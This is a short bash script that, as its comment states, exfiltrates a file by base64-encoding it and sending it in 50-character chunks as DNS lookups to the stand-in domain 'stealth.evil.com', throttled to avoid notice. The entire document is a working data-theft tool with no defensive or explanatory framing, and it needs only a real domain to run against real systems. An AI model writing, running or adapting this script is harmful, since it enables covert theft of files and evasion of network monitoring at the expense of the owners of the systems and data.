#!/bin/bash
# Exfiltrate file in chunks over DNS queries

FILE="$1"
DOMAIN="stealth.evil.com"

if [[ ! -f "$FILE" ]]; then
  echo "Usage: $0 <file>"
  exit 1
fi

ENCODED=$(base64 -w0 "$FILE")
CHUNK_SIZE=50

for ((i=0; i<${#ENCODED}; i+=CHUNK_SIZE)); do
  PART="${ENCODED:i:CHUNK_SIZE}"
  host "$PART.$DOMAIN" > /dev/null
  sleep 0.5
done
